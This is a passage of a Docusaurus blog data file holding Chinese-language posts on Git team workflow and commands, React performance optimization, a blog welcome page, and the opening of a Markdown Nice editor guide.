\u6bcf\u4e2a PR \u53ea\u505a\u4e00\u4ef6\u4e8b\\n3. **\u6e05\u6670\u63cf\u8ff0** - \u8bf4\u660e\u6539\u4e86\u4ec0\u4e48\u3001\u4e3a\u4ec0\u4e48\u6539\\n4. **\u6d4b\u8bd5\u8986\u76d6** - \u786e\u4fdd\u6709\u6d4b\u8bd5\u6216\u624b\u52a8\u6d4b\u8bd5\u8fc7\\n\\n### \u4f5c\u4e3a\u5ba1\u67e5\u8005\\n\\n1. **\u53ca\u65f6\u54cd\u5e94** - 24 \u5c0f\u65f6\u5185\u5b8c\u6210 Review\\n2. **\u5efa\u8bbe\u6027\u53cd\u9988** - \u6307\u51fa\u95ee\u9898\u5e76\u7ed9\u51fa\u5efa\u8bae\\n3. **\u533a\u5206\u4f18\u5148\u7ea7** - \u5fc5\u987b\u6539 vs \u5efa\u8bae\u6539\\n4. **\u8ba4\u53ef\u597d\u4ee3\u7801** - \u770b\u5230\u597d\u7684\u8bbe\u8ba1\u8981\u8868\u626c\\n\\n### Review \u8bc4\u8bba\u6a21\u677f\\n\\n```markdown\\n# \u5fc5\u987b\u4fee\u6539\\n\ud83d\udd34 **\u5fc5\u987b**: \u8fd9\u91cc\u6709\u7a7a\u6307\u9488\u98ce\u9669\uff0c\u9700\u8981\u6dfb\u52a0\u5224\u7a7a\\n\\n# \u5efa\u8bae\u4fee\u6539\\n\ud83d\udfe1 **\u5efa\u8bae**: \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u62bd\u53d6\u6210\u72ec\u7acb\u65b9\u6cd5\\n\\n# \u7591\u95ee\\n\ud83d\udd35 **\u7591\u95ee**: \u8fd9\u91cc\u4e3a\u4ec0\u4e48\u7528 forEach \u800c\u4e0d\u662f map\uff1f\\n\\n# \u8ba4\u53ef\\n\u2705 **Nice**: \u8fd9\u4e2a\u5c01\u88c5\u5f88\u4f18\u96c5\uff01\\n```\\n\\n---\\n\\n## \ud83d\udee0 \u5e38\u7528 Git \u547d\u4ee4\\n\\n### \u65e5\u5e38\u64cd\u4f5c\\n\\n```bash\\n# \u67e5\u770b\u72b6\u6001\\ngit status\\ngit log --oneline -10\\n\\n# \u6682\u5b58\u66f4\u6539\\ngit stash\\ngit stash pop\\ngit stash list\\n\\n# \u64a4\u9500\u66f4\u6539\\ngit checkout -- <file>      # \u64a4\u9500\u5de5\u4f5c\u533a\u4fee\u6539\\ngit reset HEAD <file>       # \u53d6\u6d88\u6682\u5b58\\ngit reset --soft HEAD~1     # \u64a4\u9500\u6700\u8fd1\u4e00\u6b21\u63d0\u4ea4\uff08\u4fdd\u7559\u66f4\u6539\uff09\\ngit reset --hard HEAD~1     # \u64a4\u9500\u6700\u8fd1\u4e00\u6b21\u63d0\u4ea4\uff08\u4e22\u5f03\u66f4\u6539\uff09\\n```\\n\\n### \u5206\u652f\u64cd\u4f5c\\n\\n```bash\\n# \u67e5\u770b\u5206\u652f\\ngit branch -a\\n\\n# \u5207\u6362\u5206\u652f\\ngit checkout <branch>\\ngit switch <branch>         # Git 2.23+\\n\\n# \u521b\u5efa\u5e76\u5207\u6362\\ngit checkout -b <branch>\\ngit switch -c <branch>\\n\\n# \u5220\u9664\u5206\u652f\\ngit branch -d <branch>      # \u5b89\u5168\u5220\u9664\\ngit branch -D <branch>      # \u5f3a\u5236\u5220\u9664\\n```\\n\\n### \u5408\u5e76\u64cd\u4f5c\\n\\n```bash\\n# \u5408\u5e76\u5206\u652f\\ngit merge <branch>\\n\\n# \u53d8\u57fa\\ngit rebase <branch>\\ngit rebase -i HEAD~3        # \u4ea4\u4e92\u5f0f\u53d8\u57fa\\n\\n# \u89e3\u51b3\u51b2\u7a81\u540e\\ngit add .\\ngit rebase --continue\\n# \u6216\\ngit merge --continue\\n```\\n\\n### \u8fdc\u7a0b\u64cd\u4f5c\\n\\n```bash\\n# \u67e5\u770b\u8fdc\u7a0b\\ngit remote -v\\n\\n# \u62c9\u53d6\u66f4\u65b0\\ngit fetch origin\\ngit pull origin main\\n\\n# \u63a8\u9001\\ngit push origin <branch>\\ngit push -u origin <branch>  # \u8bbe\u7f6e\u4e0a\u6e38\\ngit push --force-with-lease  # \u5b89\u5168\u5f3a\u5236\u63a8\u9001\\n```\\n\\n---\\n\\n## \u26a0\ufe0f \u5e38\u89c1\u95ee\u9898\u5904\u7406\\n\\n### 1. \u4e0d\u5c0f\u5fc3\u63d0\u4ea4\u5230\u4e86\u9519\u8bef\u5206\u652f\\n\\n```bash\\n# \u65b9\u6cd51\uff1acherry-pick\\ngit checkout correct-branch\\ngit cherry-pick <commit-hash>\\ngit checkout wrong-branch\\ngit reset --hard HEAD~1\\n\\n# \u65b9\u6cd52\uff1a\u521b\u5efa\u65b0\u5206\u652f\u4fdd\u5b58\u66f4\u6539\\ngit branch new-branch\\ngit reset --hard HEAD~1\\n```\\n\\n### 2. \u9700\u8981\u4fee\u6539\u6700\u8fd1\u7684 commit message\\n\\n```bash\\ngit commit --amend -m \\"\u65b0\u7684\u63d0\u4ea4\u4fe1\u606f\\"\\n```\\n\\n### 3. \u5408\u5e76\u51b2\u7a81\\n\\n```bash\\n# 1. \u67e5\u770b\u51b2\u7a81\u6587\u4ef6\\ngit status\\n\\n# 2. \u624b\u52a8\u89e3\u51b3\u51b2\u7a81\uff08\u7f16\u8f91\u6587\u4ef6\uff09\\n\\n# 3. \u6807\u8bb0\u4e3a\u5df2\u89e3\u51b3\\ngit add <resolved-files>\\n\\n# 4. \u7ee7\u7eed\u64cd\u4f5c\\ngit merge --continue\\n# \u6216\\ngit rebase --continue\\n```\\n\\n### 4. \u6062\u590d\u5220\u9664\u7684\u5206\u652f\\n\\n```bash\\n# \u67e5\u770b\u5386\u53f2\\ngit reflog\\n\\n# \u6062\u590d\u5206\u652f\\ngit checkout -b <branch-name> <commit-hash>\\n```\\n\\n---\\n\\n## \ud83d\udccb \u56e2\u961f\u89c4\u8303\u68c0\u67e5\u6e05\u5355\\n\\n| \u89c4\u8303\u9879 | \u8bf4\u660e |\\n|--------|------|\\n| \u2705 \u7edf\u4e00\u5206\u652f\u547d\u540d | feature/\u3001fix/\u3001hotfix/ |\\n| \u2705 Commit \u89c4\u8303 | Conventional Commits |\\n| \u2705 PR \u6a21\u677f | \u6807\u51c6\u5316\u7684\u63cf\u8ff0\u683c\u5f0f |\\n| \u2705 Code Review | \u5fc5\u987b\u81f3\u5c11 1 \u4eba\u5ba1\u6838 |\\n| \u2705 CI \u68c0\u67e5 | \u81ea\u52a8\u8fd0\u884c\u6d4b\u8bd5\u548c lint |\\n| \u2705 \u4fdd\u62a4\u4e3b\u5206\u652f | \u7981\u6b62\u76f4\u63a5 push \u5230 main |\\n\\n---\\n\\n\u597d\u7684 Git \u5de5\u4f5c\u6d41\u4e0d\u662f\u4e00\u6210\u4e0d\u53d8\u7684\uff0c\u9700\u8981\u6839\u636e\u56e2\u961f\u89c4\u6a21\u548c\u9879\u76ee\u7279\u70b9\u6765\u8c03\u6574\u3002\u6700\u91cd\u8981\u7684\u662f\u56e2\u961f\u8fbe\u6210\u5171\u8bc6\u5e76\u575a\u6301\u6267\u884c\u3002\\n\\n\u4f60\u4eec\u56e2\u961f\u4f7f\u7528\u4ec0\u4e48 Git \u5de5\u4f5c\u6d41\uff1f\u6b22\u8fce\u5206\u4eab\u4f60\u7684\u7ecf\u9a8c\uff01"},{"id":"react-performance","metadata":{"permalink":"/blog/react-performance","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-01-15-react-performance.md","source":"@site/blog/2024-01-15-react-performance.md","title":"React \u6027\u80fd\u4f18\u5316\u5b9e\u6218\u6307\u5357","description":"React \u5e94\u7528\u7684\u6027\u80fd\u4f18\u5316\u662f\u4e00\u4e2a\u6c38\u6052\u7684\u8bdd\u9898\u3002\u672c\u6587\u603b\u7ed3\u4e86\u6211\u5728\u5b9e\u9645\u9879\u76ee\u4e2d\u4f7f\u7528\u7684\u4f18\u5316\u7b56\u7565\uff0c\u5e2e\u52a9\u4f60\u6253\u9020\u6d41\u7545\u7684\u7528\u6237\u4f53\u9a8c\u3002","date":"2024-01-15T00:00:00.000Z","tags":[{"inline":true,"label":"React","permalink":"/blog/tags/react"},{"inline":true,"label":"\u6027\u80fd\u4f18\u5316","permalink":"/blog/tags/\u6027\u80fd\u4f18\u5316"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"}],"readingTime":4.09,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"react-performance","title":"React \u6027\u80fd\u4f18\u5316\u5b9e\u6218\u6307\u5357","authors":"mason","tags":["React","\u6027\u80fd\u4f18\u5316","\u524d\u7aef"]},"unlisted":false,"prevItem":{"title":"Git \u5de5\u4f5c\u6d41\u6700\u4f73\u5b9e\u8df5","permalink":"/blog/git-workflow"},"nextItem":{"title":"\u6b22\u8fce\u6765\u5230\u6211\u7684\u6280\u672f\u535a\u5ba2","permalink":"/blog/welcome"}},"content":"React \u5e94\u7528\u7684\u6027\u80fd\u4f18\u5316\u662f\u4e00\u4e2a\u6c38\u6052\u7684\u8bdd\u9898\u3002\u672c\u6587\u603b\u7ed3\u4e86\u6211\u5728\u5b9e\u9645\u9879\u76ee\u4e2d\u4f7f\u7528\u7684\u4f18\u5316\u7b56\u7565\uff0c\u5e2e\u52a9\u4f60\u6253\u9020\u6d41\u7545\u7684\u7528\u6237\u4f53\u9a8c\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u6027\u80fd\u4f18\u5316\u7684\u6838\u5fc3\u539f\u5219\\n\\n\u5728\u5f00\u59cb\u4f18\u5316\u4e4b\u524d\uff0c\u8bb0\u4f4f\u8fd9\u4e9b\u539f\u5219\uff1a\\n\\n1. **\u5148\u6d4b\u91cf\uff0c\u540e\u4f18\u5316** - \u4e0d\u8981\u8fc7\u65e9\u4f18\u5316\\n2. **\u627e\u5230\u74f6\u9888** - \u4f7f\u7528 React DevTools Profiler\\n3. **\u6743\u8861\u53d6\u820d** - \u4f18\u5316\u6709\u6210\u672c\uff0c\u9002\u5ea6\u5373\u53ef\\n\\n## \ud83d\udcca \u8bc6\u522b\u6027\u80fd\u95ee\u9898\\n\\n### \u4f7f\u7528 React DevTools Profiler\\n\\n```javascript\\n// \u5f00\u53d1\u73af\u5883\u81ea\u52a8\u53ef\u7528\\n// \u751f\u4ea7\u73af\u5883\u9700\u8981\u542f\u7528 profiling build\\n```\\n\\n### \u5e38\u89c1\u7684\u6027\u80fd\u95ee\u9898\u4fe1\u53f7\\n\\n- \u8f93\u5165\u6846\u6253\u5b57\u5361\u987f\\n- \u6eda\u52a8\u4e0d\u6d41\u7545\\n- \u7ec4\u4ef6\u9891\u7e41\u95ea\u70c1\\n- \u521d\u6b21\u6e32\u67d3\u65f6\u95f4\u8fc7\u957f\\n\\n---\\n\\n## \ud83d\udd27 \u4f18\u5316\u7b56\u7565\u4e00\uff1a\u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u91cd\u6e32\u67d3\\n\\n### 1. React.memo\\n\\n\u5bf9\u4e8e\u7eaf\u5c55\u793a\u7ec4\u4ef6\uff0c\u4f7f\u7528 `React.memo` \u5305\u88f9\uff1a\\n\\n```jsx\\n// \u274c \u6bcf\u6b21\u7236\u7ec4\u4ef6\u66f4\u65b0\u90fd\u4f1a\u91cd\u6e32\u67d3\\nconst UserCard = ({ user }) => {\\n  return (\\n    <div className=\\"card\\">\\n      <h3>{user.name}</h3>\\n      <p>{user.email}</p>\\n    </div>\\n  );\\n};\\n\\n// \u2705 \u53ea\u6709 props \u53d8\u5316\u65f6\u624d\u91cd\u6e32\u67d3\\nconst UserCard = React.memo(({ user }) => {\\n  return (\\n    <div className=\\"card\\">\\n      <h3>{user.name}</h3>\\n      <p>{user.email}</p>\\n    </div>\\n  );\\n});\\n```\\n\\n### 2. useMemo - \u7f13\u5b58\u8ba1\u7b97\u7ed3\u679c\\n\\n```jsx\\n// \u274c \u6bcf\u6b21\u6e32\u67d3\u90fd\u4f1a\u91cd\u65b0\u8ba1\u7b97\\nconst ExpensiveComponent = ({ items, filter }) => {\\n  const filteredItems = items.filter(item => \\n    item.name.includes(filter)\\n  );\\n  \\n  return <List items={filteredItems} />;\\n};\\n\\n// \u2705 \u53ea\u6709\u4f9d\u8d56\u53d8\u5316\u65f6\u624d\u91cd\u65b0\u8ba1\u7b97\\nconst ExpensiveComponent = ({ items, filter }) => {\\n  const filteredItems = useMemo(() => \\n    items.filter(item => item.name.includes(filter)),\\n    [items, filter]\\n  );\\n  \\n  return <List items={filteredItems} />;\\n};\\n```\\n\\n### 3. useCallback - \u7f13\u5b58\u51fd\u6570\u5f15\u7528\\n\\n```jsx\\n// \u274c \u6bcf\u6b21\u6e32\u67d3\u90fd\u521b\u5efa\u65b0\u51fd\u6570\uff0c\u5bfc\u81f4\u5b50\u7ec4\u4ef6\u91cd\u6e32\u67d3\\nconst Parent = () => {\\n  const [count, setCount] = useState(0);\\n  \\n  const handleClick = () => {\\n    console.log(\'clicked\');\\n  };\\n  \\n  return <Child onClick={handleClick} />;\\n};\\n\\n// \u2705 \u51fd\u6570\u5f15\u7528\u4fdd\u6301\u7a33\u5b9a\\nconst Parent = () => {\\n  const [count, setCount] = useState(0);\\n  \\n  const handleClick = useCallback(() => {\\n    console.log(\'clicked\');\\n  }, []);\\n  \\n  return <Child onClick={handleClick} />;\\n};\\n```\\n\\n:::tip \u4f7f\u7528\u65f6\u673a\\n`useMemo` \u548c `useCallback` \u4e0d\u662f\u94f6\u5f39\uff0c\u53ea\u5728\u4ee5\u4e0b\u60c5\u51b5\u4f7f\u7528\uff1a\\n- \u8ba1\u7b97\u786e\u5b9e\u6602\u8d35\\n- \u4f5c\u4e3a props \u4f20\u9012\u7ed9 `React.memo` \u7ec4\u4ef6\\n- \u4f5c\u4e3a\u5176\u4ed6 Hook \u7684\u4f9d\u8d56\\n:::\\n\\n---\\n\\n## \ud83d\udd27 \u4f18\u5316\u7b56\u7565\u4e8c\uff1a\u5217\u8868\u4f18\u5316\\n\\n### 1. \u4f7f\u7528\u6b63\u786e\u7684 key\\n\\n```jsx\\n// \u274c \u4f7f\u7528 index \u4f5c\u4e3a key\uff08\u5217\u8868\u4f1a\u53d8\u5316\u65f6\uff09\\n{items.map((item, index) => (\\n  <Item key={index} data={item} />\\n))}\\n\\n// \u2705 \u4f7f\u7528\u552f\u4e00\u6807\u8bc6\\n{items.map(item => (\\n  <Item key={item.id} data={item} />\\n))}\\n```\\n\\n### 2. \u865a\u62df\u5217\u8868\\n\\n\u5bf9\u4e8e\u5927\u91cf\u6570\u636e\uff0c\u4f7f\u7528\u865a\u62df\u5217\u8868\u53ea\u6e32\u67d3\u53ef\u89c1\u533a\u57df\uff1a\\n\\n```jsx\\nimport { FixedSizeList } from \'react-window\';\\n\\nconst VirtualList = ({ items }) => (\\n  <FixedSizeList\\n    height={400}\\n    itemCount={items.length}\\n    itemSize={50}\\n    width=\\"100%\\"\\n  >\\n    {({ index, style }) => (\\n      <div style={style}>\\n        {items[index].name}\\n      </div>\\n    )}\\n  </FixedSizeList>\\n);\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u4f18\u5316\u7b56\u7565\u4e09\uff1a\u72b6\u6001\u7ba1\u7406\u4f18\u5316\\n\\n### 1. \u72b6\u6001\u4e0b\u6c89\\n\\n\u5c06\u72b6\u6001\u653e\u5728\u9700\u8981\u5b83\u7684\u6700\u8fd1\u7ec4\u4ef6\u4e2d\uff1a\\n\\n```jsx\\n// \u274c \u72b6\u6001\u63d0\u5347\u8fc7\u9ad8\uff0c\u5bfc\u81f4\u6574\u4e2a\u5217\u8868\u91cd\u6e32\u67d3\\nconst TodoList = () => {\\n  const [editingId, setEditingId] = useState(null);\\n  \\n  return (\\n    <ul>\\n      {todos.map(todo => (\\n        <TodoItem \\n          key={todo.id}\\n          todo={todo}\\n          isEditing={editingId === todo.id}\\n          onEdit={setEditingId}\\n        />\\n      ))}\\n    </ul>\\n  );\\n};\\n\\n// \u2705 \u6bcf\u4e2a item \u7ba1\u7406\u81ea\u5df1\u7684\u7f16\u8f91\u72b6\u6001\\nconst TodoItem = ({ todo }) => {\\n  const [isEditing, setIsEditing] = useState(false);\\n  // ...\\n};\\n```\\n\\n### 2. \u72b6\u6001\u62c6\u5206\\n\\n```jsx\\n// \u274c \u4e00\u4e2a\u5927\u72b6\u6001\u5bf9\u8c61\\nconst [state, setState] = useState({\\n  user: null,\\n  posts: [],\\n  comments: [],\\n  loading: false\\n});\\n\\n// \u2705 \u62c6\u5206\u6210\u72ec\u7acb\u72b6\u6001\\nconst [user, setUser] = useState(null);\\nconst [posts, setPosts] = useState([]);\\nconst [comments, setComments] = useState([]);\\nconst [loading, setLoading] = useState(false);\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u4f18\u5316\u7b56\u7565\u56db\uff1a\u4ee3\u7801\u5206\u5272\\n\\n### 1. React.lazy + Suspense\\n\\n```jsx\\n// \u8def\u7531\u7ea7\u522b\u7684\u4ee3\u7801\u5206\u5272\\nconst Dashboard = React.lazy(() => import(\'./pages/Dashboard\'));\\nconst Settings = React.lazy(() => import(\'./pages/Settings\'));\\n\\nfunction App() {\\n  return (\\n    <Suspense fallback={<Loading />}>\\n      <Routes>\\n        <Route path=\\"/dashboard\\" element={<Dashboard />} />\\n        <Route path=\\"/settings\\" element={<Settings />} />\\n      </Routes>\\n    </Suspense>\\n  );\\n}\\n```\\n\\n### 2. \u7ec4\u4ef6\u7ea7\u522b\u7684\u61d2\u52a0\u8f7d\\n\\n```jsx\\n// \u5927\u578b\u7ec4\u4ef6\u6309\u9700\u52a0\u8f7d\\nconst HeavyChart = React.lazy(() => import(\'./components/HeavyChart\'));\\n\\nconst Analytics = () => {\\n  const [showChart, setShowChart] = useState(false);\\n  \\n  return (\\n    <div>\\n      <button onClick={() => setShowChart(true)}>\\n        \u663e\u793a\u56fe\u8868\\n      </button>\\n      {showChart && (\\n        <Suspense fallback={<Skeleton />}>\\n          <HeavyChart />\\n        </Suspense>\\n      )}\\n    </div>\\n  );\\n};\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u4f18\u5316\u7b56\u7565\u4e94\uff1a\u907f\u514d\u5e38\u89c1\u9677\u9631\\n\\n### 1. \u907f\u514d\u5728\u6e32\u67d3\u4e2d\u521b\u5efa\u5bf9\u8c61\\n\\n```jsx\\n// \u274c \u6bcf\u6b21\u6e32\u67d3\u521b\u5efa\u65b0\u5bf9\u8c61\\n<Component style={{ color: \'red\' }} />\\n<Component data={{ id: 1, name: \'test\' }} />\\n\\n// \u2705 \u4f7f\u7528\u5e38\u91cf\u6216 useMemo\\nconst style = { color: \'red\' };\\n<Component style={style} />\\n\\n// \u6216\\nconst data = useMemo(() => ({ id: 1, name: \'test\' }), []);\\n<Component data={data} />\\n```\\n\\n### 2. \u907f\u514d\u533f\u540d\u51fd\u6570\\n\\n```jsx\\n// \u274c \u5185\u8054\u533f\u540d\u51fd\u6570\\n<button onClick={() => handleClick(id)}>Click</button>\\n\\n// \u2705 \u4f7f\u7528 useCallback \u6216\u63d0\u53d6\u7ec4\u4ef6\\nconst handleItemClick = useCallback(() => {\\n  handleClick(id);\\n}, [id, handleClick]);\\n\\n<button onClick={handleItemClick}>Click</button>\\n```\\n\\n---\\n\\n## \ud83d\udcc8 \u6027\u80fd\u4f18\u5316\u68c0\u67e5\u6e05\u5355\\n\\n| \u68c0\u67e5\u9879 | \u8bf4\u660e |\\n|--------|------|\\n| \u2705 \u4f7f\u7528 React DevTools \u5206\u6790 | \u627e\u5230\u771f\u6b63\u7684\u74f6\u9888 |\\n| \u2705 \u5927\u5217\u8868\u4f7f\u7528\u865a\u62df\u5316 | react-window / react-virtualized |\\n| \u2705 \u5408\u7406\u4f7f\u7528 memo/useMemo/useCallback | \u907f\u514d\u4e0d\u5fc5\u8981\u7684\u91cd\u6e32\u67d3 |\\n| \u2705 \u4ee3\u7801\u5206\u5272 | \u51cf\u5c11\u9996\u5c4f\u52a0\u8f7d\u65f6\u95f4 |\\n| \u2705 \u72b6\u6001\u7ba1\u7406\u4f18\u5316 | \u72b6\u6001\u4e0b\u6c89\u3001\u62c6\u5206 |\\n| \u2705 \u907f\u514d\u6e32\u67d3\u4e2d\u521b\u5efa\u5bf9\u8c61/\u51fd\u6570 | \u4fdd\u6301\u5f15\u7528\u7a33\u5b9a |\\n\\n---\\n\\n## \ud83d\udd17 \u63a8\u8350\u8d44\u6e90\\n\\n- [React \u5b98\u65b9\u6027\u80fd\u4f18\u5316\u6587\u6863](https://react.dev/learn/render-and-commit)\\n- [use-what-changed](https://github.com/simbathesailor/use-what-changed) - \u8c03\u8bd5 Hook \u4f9d\u8d56\\n- [why-did-you-render](https://github.com/welldone-software/why-did-you-render) - \u8ffd\u8e2a\u91cd\u6e32\u67d3\u539f\u56e0\\n\\n---\\n\\n\u6027\u80fd\u4f18\u5316\u662f\u4e00\u4e2a\u6301\u7eed\u7684\u8fc7\u7a0b\u3002\u8bb0\u4f4f\uff1a**\u5148\u8ba9\u5b83\u5de5\u4f5c\uff0c\u518d\u8ba9\u5b83\u5feb**\u3002\u4e0d\u8981\u8fc7\u65e9\u4f18\u5316\uff0c\u4f46\u4e5f\u4e0d\u8981\u5ffd\u89c6\u660e\u663e\u7684\u6027\u80fd\u95ee\u9898\u3002\\n\\n\u4f60\u5728\u9879\u76ee\u4e2d\u9047\u5230\u8fc7\u54ea\u4e9b\u6027\u80fd\u95ee\u9898\uff1f\u6b22\u8fce\u5728\u8bc4\u8bba\u533a\u5206\u4eab\u4f60\u7684\u7ecf\u9a8c\uff01"},{"id":"welcome","metadata":{"permalink":"/blog/welcome","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2022-01-01-welcome.md","source":"@site/blog/2022-01-01-welcome.md","title":"\u6b22\u8fce\u6765\u5230\u6211\u7684\u6280\u672f\u535a\u5ba2","description":"\ud83c\udf89 \u6b22\u8fce\u6765\u5230 Hweos \u6280\u672f\u535a\u5ba2\uff01\u8fd9\u91cc\u5c06\u8bb0\u5f55\u6211\u5728\u6280\u672f\u9053\u8def\u4e0a\u7684\u5b66\u4e60\u4e0e\u6210\u957f\u3002","date":"2022-01-01T00:00:00.000Z","tags":[{"inline":true,"label":"\u516c\u544a","permalink":"/blog/tags/\u516c\u544a"},{"inline":true,"label":"\u535a\u5ba2","permalink":"/blog/tags/\u535a\u5ba2"}],"readingTime":0.84,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"welcome","title":"\u6b22\u8fce\u6765\u5230\u6211\u7684\u6280\u672f\u535a\u5ba2","authors":"mason","tags":["\u516c\u544a","\u535a\u5ba2"]},"unlisted":false,"prevItem":{"title":"React \u6027\u80fd\u4f18\u5316\u5b9e\u6218\u6307\u5357","permalink":"/blog/react-performance"},"nextItem":{"title":"Markdown Nice \u4f7f\u7528\u6307\u5357","permalink":"/blog/markdown-nice-guide"}},"content":"\ud83c\udf89 \u6b22\u8fce\u6765\u5230 Hweos \u6280\u672f\u535a\u5ba2\uff01\u8fd9\u91cc\u5c06\u8bb0\u5f55\u6211\u5728\u6280\u672f\u9053\u8def\u4e0a\u7684\u5b66\u4e60\u4e0e\u6210\u957f\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \u5173\u4e8e\u8fd9\u4e2a\u535a\u5ba2\\n\\n\u8fd9\u4e2a\u535a\u5ba2\u4f7f\u7528 [Docusaurus](https://docusaurus.io/) \u6784\u5efa\uff0c\u662f\u4e00\u4e2a\u73b0\u4ee3\u5316\u7684\u9759\u6001\u7f51\u7ad9\u751f\u6210\u5668\u3002\u6211\u9009\u62e9\u5b83\u7684\u539f\u56e0\uff1a\\n\\n- \u26a1 **\u5feb\u901f** - \u9759\u6001\u751f\u6210\uff0c\u52a0\u8f7d\u901f\u5ea6\u5feb\\n- \ud83d\udcdd **Markdown** - \u4f7f\u7528\u719f\u6089\u7684 Markdown \u5199\u4f5c\\n- \ud83c\udfa8 **\u53ef\u5b9a\u5236** - \u652f\u6301\u81ea\u5b9a\u4e49\u4e3b\u9898\u548c\u7ec4\u4ef6\\n- \ud83d\udd0d **SEO \u53cb\u597d** - \u5185\u7f6e SEO \u4f18\u5316\\n\\n## \u5185\u5bb9\u89c4\u5212\\n\\n\u6211\u8ba1\u5212\u5728\u8fd9\u91cc\u5206\u4eab\u4ee5\u4e0b\u5185\u5bb9\uff1a\\n\\n### \ud83d\udcda \u6280\u672f\u6587\u6863\\n\\n- \u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u7b14\u8bb0\\n- \u5f00\u53d1\u5de5\u5177\u4f7f\u7528\u6307\u5357\\n- \u6846\u67b6\u548c\u5e93\u7684\u6df1\u5165\u63a2\u7d22\\n\\n### \u270d\ufe0f \u535a\u5ba2\u6587\u7ae0\\n\\n- \u9879\u76ee\u5b9e\u6218\u7ecf\u9a8c\\n- \u6280\u672f\u9009\u578b\u601d\u8003\\n- \u8e29\u5751\u4e0e\u89e3\u51b3\u65b9\u6848\\n\\n### \ud83d\udca1 \u5b66\u4e60\u7b14\u8bb0\\n\\n- \u8bfb\u4e66\u7b14\u8bb0\\n- \u8bfe\u7a0b\u5b66\u4e60\u603b\u7ed3\\n- \u6280\u672f\u52a8\u6001\u8ffd\u8e2a\\n\\n## \u4fdd\u6301\u8054\u7cfb\\n\\n\u5982\u679c\u4f60\u5bf9\u6211\u7684\u5185\u5bb9\u611f\u5174\u8da3\uff0c\u6b22\u8fce\uff1a\\n\\n- \u2b50 \u5728 [GitHub](https://github.com/HuangZhe007) \u4e0a\u5173\u6ce8\u6211\\n- \ud83d\udce7 \u901a\u8fc7 Issue \u4e0e\u6211\u4ea4\u6d41\\n\\n---\\n\\n> \u5929\u8d4b\u4e0d\u80fd\u5e26\u6765\u7684\u4e1c\u897f\uff0c\u52aa\u529b\u6216\u8bb8\u53ef\u4ee5\u6539\u53d8\u3002\\n\\n\u611f\u8c22\u4f60\u7684\u5230\u6765\uff0c\u5e0c\u671b\u8fd9\u91cc\u7684\u5185\u5bb9\u5bf9\u4f60\u6709\u6240\u5e2e\u52a9\uff01\ud83d\ude80"},{"id":"markdown-nice-guide","metadata":{"permalink":"/blog/markdown-nice-guide","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2021-12-16-test.md","source":"@site/blog/2021-12-16-test.md","title":"Markdown Nice \u4f7f\u7528\u6307\u5357","description":"\u4e00\u6b3e\u652f\u6301\u81ea\u5b9a\u4e49\u6837\u5f0f\u7684 Markdown \u7f16\u8f91\u5668\uff0c\u8ba9\u4f60\u7684\u6587\u7ae0\u5728\u5fae\u4fe1\u516c\u4f17\u53f7\u3001\u77e5\u4e4e\u548c\u7a00\u571f\u6398\u91d1\u4e0a\u7115\u53d1\u5149\u5f69\u3002","date":"2021-12-16T00:00:00.000Z","tags":[{"inline":true,"label":"Markdown","permalink":"/blog/tags/markdown"},{"inline":true,"label":"\u5de5\u5177","permalink":"/blog/tags/\u5de5\u5177"},{"inline":true,"label":"\u5199\u4f5c","permalink":"/blog/tags/\u5199\u4f5c"}],"readingTime":1.24,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"markdown-nice-guide","title":"Markdown Nice \u4f7f\u7528\u6307\u5357","authors":"mason","tags":["Markdown","\u5de5\u5177","\u5199\u4f5c"]},"unlisted":false,"prevItem":{"title":"\u6b22\u8fce\u6765\u5230\u6211\u7684\u6280\u672f\u535a\u5ba2","permalink":"/blog/welcome"}},"content":"\u4e00\u6b3e\u652f\u6301\u81ea\u5b9a\u4e49\u6837\u5f0f\u7684 Markdown \u7f16\u8f91\u5668\uff0c\u8ba9\u4f60\u7684\u6587\u7ae0\u5728\u5fae\u4fe1\u516c\u4f17\u53f7\u3001\u77e5\u4e4e\u548c\u7a00\u571f\u6398\u91d1\u4e0a\u7115\u53d1\u5149\u5f69\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n:::tip \u63d0\u793a\\n\u8bf7\u4f7f\u7528 **Chrome** \u6d4f\u89c8\u5668\u4ee5\u83b7\u5f97\u6700\u4f73\u4f53\u9a8c\u3002\\n:::\\n\\n## 1. Markdown Nice \u7b80\u4ecb\\n\\n- \ud83c\udfa8 \u652f\u6301\u81ea\u5b9a\u4e49\u6837\u5f0f\u7684 Markdown \u7f16\u8f91\u5668\\n- \ud83d\udcf1 \u652f\u6301\u5fae\u4fe1\u516c\u4f17\u53f7\u3001\u77e5\u4e4e\u548c\u7a00\u571f\u6398\u91d1\\n- \ud83c\udf10 \u5728\u7ebf\u7f16\u8f91\u5668\uff1a[mdnice.com](https://mdnice.com/)\\n\\n## 2. \u4e3b\u9898\u9884\u89c8\\n\\n\u8bbf\u95ee\u4e3b\u9898\u5e93\u83b7\u53d6\u66f4\u591a\u7cbe\u7f8e\u4e3b\u9898\uff1a**https://preview.mdnice.com/themes/**\\n\\n\u6b22\u8fce\u63d0\u4ea4\u4e3b\u9898\uff0c\u63d0\u4f9b\u66f4\u591a\u6587\u7ae0\u793a\u4f8b~~\\n\\n## 3. Markdown 